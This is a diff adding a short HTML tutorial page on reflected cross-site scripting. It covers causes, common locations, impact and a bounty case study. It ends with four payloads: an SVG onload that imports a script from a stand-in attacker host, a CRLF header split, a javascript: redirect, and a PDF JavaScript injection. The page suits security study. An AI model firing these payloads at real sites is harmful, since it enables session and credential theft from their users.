@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reflected XSS</title>
+    <style>
+        :root{--bg:#0d0f17;--surface:#13151c;--text:#a0a8b8;--accent:#7aa2f7;--border:#24283b;--cyan:#7dcfff;--green:#9ece6a;--yellow:#e0af68;}
+        *{box-sizing:border-box;margin:0;padding:0;}
+        body{font-family:"Cascadia Code","Fira Mono",Consolas,monospace;background:var(--bg);color:var(--text);font-size:14px;line-height:1.6;min-height:100vh;}
+        .bar{background:var(--surface);border-bottom:1px solid var(--border);padding:8px 16px;display:flex;justify-content:space-between;position:sticky;top:0;z-index:10;}
+        .bar span{color:var(--accent);}
+        .wrap{max-width:960px;margin:auto;padding:2rem 1rem;}
+        .prompt{color:var(--green);}.cmd{color:var(--yellow);}
+        h1,h2,h3{color:var(--accent);margin-top:1.5rem;margin-bottom:.5rem;}
+        h1{font-size:1.4rem;}h2{font-size:1.2rem;}h3{font-size:1.05rem;}
+        code{background:var(--surface);border:1px solid var(--border);padding:2px 4px;border-radius:3px;color:var(--yellow);font-size:13px;}
+        pre{background:var(--surface);border:1px solid var(--border);border-radius:4px;padding:.75rem 1rem;overflow-x:auto;margin:.5rem 0;}
+        ul{margin-left:1.2rem;margin-top:.5rem;}li{margin-bottom:.25rem;}
+        footer{text-align:center;padding:2rem 0;color:var(--cyan);font-size:12px;}
+    </style>
+</head>
+<body>
+<div class="bar"><span>user@lab</span><span>~/xss/03-reflected-xss</span></div>
+<main class="wrap">
+    <h1>Reflected XSS</h1>
+
+    <h2>What it is</h2>
+    <p>Payload travels in the HTTP request and is immediately echoed in the response. No persistence, but one-click pwn.</p>
+
+    <h2>Why it happens</h2>
+    <p>Template engines print request parameters verbatim: <code>&lt;input value="&lt;?=$_GET['q']?&gt;"&gt;</code>. Break out of quotes → code.</p>
+
+    <h2>Where you’ll meet it</h2>
+    <p>Search bars, 404 pages, tracking parameters, preview modes, payment flows (“returnUrl”).</p>
+
+    <h2>Impact</h2>
+    <p>One-shot credential steal, payment hijack, OAuth token redirect, cache poison → becomes stored for others.</p>
+
+    <h2>Mini case-study</h2>
+    <p>2022 Twitter “return_to” reflected XSS → stole admin session on ads.twitter.com → $7 000 bounty.</p>
+
+    <h2>Payloads</h2>
+    <!-- Cache poison -->
+    <pre>// Reflected payload cached by CDN → every visitor infected<code>
+GET /search?q=&lt;svg onload=import('//att/m')&gt;</code></pre>
+
+    <!-- CRLF split -->
+    <pre>// Inject response body via header split (PHP allows CR)<code>
+/?redir=http://att%0DContent-Length:%200%0D%0D&lt;html&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+
+    <!-- 302 JS protocol -->
+    <pre>// Location header accepts javascript: → still executes<code>
+header("Location: javascript:alert(1)");</code></pre>
+
+    <!-- PDF launch action -->
+    <pre>// User input lands in PDF launch action<code>
+/?name=)]>>/Root&lt;&lt;/JavaScript&lt;&lt;/JS(alert(1))&gt;&gt;</code></pre>
+
+</main>
+<footer><span>EOF ── happy hacking :)</span></footer>
+</body>
+</html>
